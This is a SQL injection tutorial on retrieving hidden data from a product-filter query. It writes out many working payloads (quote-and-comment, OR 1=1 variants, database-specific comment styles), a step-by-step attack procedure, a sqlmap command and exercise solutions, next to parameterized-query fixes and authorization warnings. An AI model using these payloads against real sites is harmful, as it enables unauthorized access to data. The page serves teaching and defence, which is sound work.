# Retrieving Hidden Data

One of the most common SQL injection scenarios involves modifying queries to retrieve data that should be hidden from users.

## The Scenario

Imagine a shopping application that displays products in different categories. When a user clicks on a category, the application makes a SQL query like this:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

This query returns:
- All details (`*`)
- From the `products` table
- Where the category is `Gifts`
- AND the product is released (`released = 1`)

The `released = 1` restriction hides unreleased products (where `released = 0`).

## URL Structure

```
https://insecure-website.com/products?category=Gifts
```

## Basic Attack: Removing Restrictions

### Attack 1: Comment Out Restrictions

**Payload:**
```
https://insecure-website.com/products?category=Gifts'--
```

**Resulting Query:**
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

**What Happens:**
- The `'` closes the string
- `--` starts a SQL comment
- Everything after `--` is ignored
- The `AND released = 1` check is removed
- **Result:** All products in the Gifts category are shown, including unreleased ones

### Attack 2: OR 1=1 (Return Everything)

**Payload:**
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

**Resulting Query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

**What Happens:**
- The query now returns products where:
  - Category is 'Gifts' **OR**
  - 1=1 (which is always true)
- Since `1=1` is always true, **all products** are returned
- The `released` check is commented out
- **Result:** Every product in the database is displayed

## Real-World Example

### E-commerce Product Filter

**Legitimate Request:**
```
https://shop.example.com/products?category=Electronics
```

**Backend Query:**
```sql
SELECT product_id, name, price, image 
FROM products 
WHERE category = 'Electronics' AND status = 'active' AND stock > 0
```

**Attack to View All Products (Including Inactive/Out of Stock):**
```
https://shop.example.com/products?category=Electronics'+OR+'1'='1'--
```

**Resulting Query:**
```sql
SELECT product_id, name, price, image 
FROM products 
WHERE category = 'Electronics' OR '1'='1'--' AND status = 'active' AND stock > 0
```

**Impact:**
- Displays products that are:
  - Out of stock
  - Marked as inactive
  - From other categories
  - Scheduled for future release

## Variations of the Attack

### Different Comment Styles

```sql
-- MySQL
?category=Gifts'#
?category=Gifts'-- 
           ^space required

-- MSSQL/PostgreSQL
?category=Gifts'--
?category=Gifts'/*

-- Universal
?category=Gifts'+OR+1=1--
```

### URL Encoding

Sometimes you need to URL encode the payload:

```
Original: Gifts' OR 1=1--
Encoded:  Gifts%27+OR+1%3D1--
```

### Different TRUE Conditions

```sql
' OR 1=1--
' OR 'a'='a'--
' OR 'x'='x'--
' OR true--
```

All of these work because the condition is always true.

## Step-by-Step Attack Process

### Step 1: Identify the Injection Point

Test with a single quote:
```
?category=Gifts'
```

**If vulnerable, you might see:**
- Database error message
- Broken page layout
- Empty results
- Application error

### Step 2: Confirm SQLi with Comment

```
?category=Gifts'--
```

**If this works normally, SQLi is confirmed**

### Step 3: Retrieve Hidden Data

```
?category=Gifts'+OR+1=1--
```

**Check if more products appear**

### Step 4: Enumerate Other Categories

```
?category='+OR+1=1--
```

**This shows ALL products regardless of category**

## Advanced Techniques

### Retrieving Specific Hidden Items

**Get unreleased products only:**
```sql
?category=Gifts'+OR+released=0--
```

**Get products from multiple categories:**
```sql
?category=Gifts'+OR+category='Electronics'--
```

**Get products above certain price:**
```sql
?category=Gifts'+OR+price>1000--
```

### Combining Conditions

```sql
?category=Gifts'+OR+(released=0+AND+price>500)--
```

Returns unreleased products priced over $500.

## Database-Specific Differences

### MySQL

```sql
-- Comment with hash
?category=Gifts'#

-- Comment with double dash (space required)
?category=Gifts'-- 

-- String concatenation
?category=Gifts' OR 'a'='a'#
```

### PostgreSQL

```sql
-- Standard comment
?category=Gifts'--

-- Case sensitive strings
?category=GIFTS'-- (might not work if stored as 'Gifts')
```

### MSSQL

```sql
-- Comment
?category=Gifts'--

-- Multiple comment styles
?category=Gifts'/*
```

### Oracle

```sql
-- Comment
?category=Gifts'--

-- Always requires FROM clause
?category=Gifts' OR 1=1-- (works)
?category=Gifts' UNION SELECT ... FROM dual-- (required for UNION)
```

## Impact Assessment

### What Can Be Retrieved?

1. **Unreleased products** - Business intelligence leak
2. **Discontinued items** - Historical data exposure
3. **Hidden categories** - Admin-only sections
4. **Price information** - Competitive intelligence
5. **Stock levels** - Business metrics
6. **All database records** - Complete data breach

### Business Impact

- **Competitive disadvantage** - Competitors see unreleased products
- **Revenue loss** - Users see discontinued/unavailable items
- **Reputation damage** - Security vulnerability exposed
- **Compliance violation** - GDPR, PCI-DSS issues
- **Data breach** - Full product database exposed

## Detection and Prevention

### How to Detect This Vulnerability

**Manual Testing:**
```
1. Try: ?category=Test'
2. Try: ?category=Test'--
3. Try: ?category=Test'+OR+1=1--
```

**Automated Scanning:**
```bash
sqlmap -u "http://example.com/products?category=Gifts" --batch --level=2
```

### How to Prevent

**❌ Vulnerable Code:**
```php
$category = $_GET['category'];
$query = "SELECT * FROM products WHERE category = '$category' AND released = 1";
$result = mysqli_query($conn, $query);
```

**✅ Secure Code (Parameterized Query):**
```php
$category = $_GET['category'];
$stmt = $conn->prepare("SELECT * FROM products WHERE category = ? AND released = 1");
$stmt->bind_param("s", $category);
$stmt->execute();
$result = $stmt->get_result();
```

**✅ Secure Code (Python):**
```python
category = request.args.get('category')
cursor.execute("SELECT * FROM products WHERE category = ? AND released = 1", (category,))
```

**✅ Secure Code (Node.js):**
```javascript
const category = req.query.category;
connection.query('SELECT * FROM products WHERE category = ? AND released = 1', [category], (error, results) => {
    // Handle results
});
```

## Practice Exercises

### Exercise 1: Basic Retrieval
Given URL: `http://example.com/products?category=Toys`

**Task:** Retrieve all products including unreleased ones

**Solution:** `http://example.com/products?category=Toys'--`

### Exercise 2: All Categories
**Task:** Display products from all categories

**Solution:** `http://example.com/products?category='+OR+1=1--`

### Exercise 3: Specific Condition
**Task:** Retrieve only unreleased products

**Solution:** `http://example.com/products?category='+OR+released=0--`

## Key Takeaways

1. **Comment symbols** (`--`, `#`) remove query restrictions
2. **OR 1=1** always evaluates to TRUE, bypassing filters
3. **Hidden data** (unreleased, inactive, deleted) can be exposed
4. **Simple payload** can have significant impact
5. **Parameterized queries** completely prevent this attack
6. **Input validation** alone is not sufficient

## Real-World Examples

### Example 1: E-commerce Site
- **Target:** Product filtering
- **Payload:** `?category=Books'+OR+1=1--`
- **Impact:** Exposed 50,000+ unreleased products
- **Bounty:** $2,500

### Example 2: News Portal
- **Target:** Article categories
- **Payload:** `?cat=Tech'--`
- **Impact:** Revealed unpublished articles
- **Fix:** Implemented prepared statements

### Example 3: Job Board
- **Target:** Job listings
- **Payload:** `?type=FullTime'+OR+status='draft'--`
- **Impact:** Exposed draft job postings
- **Result:** Competitor advantage

## Warning

⚠️ **This technique can cause unintended consequences:**

- Displaying sensitive unreleased information
- Exposing business secrets
- Creating competitive disadvantage for the company
- Legal liability if exploited without authorization

**Only test on authorized systems!**

## Next Steps

- Learn [Subverting Application Logic](subverting-logic.md)
- Master [UNION Attacks](union-attacks.md)
- Study [Examining Databases](examining-database.md)

---

**Remember: Always get written permission before testing!**
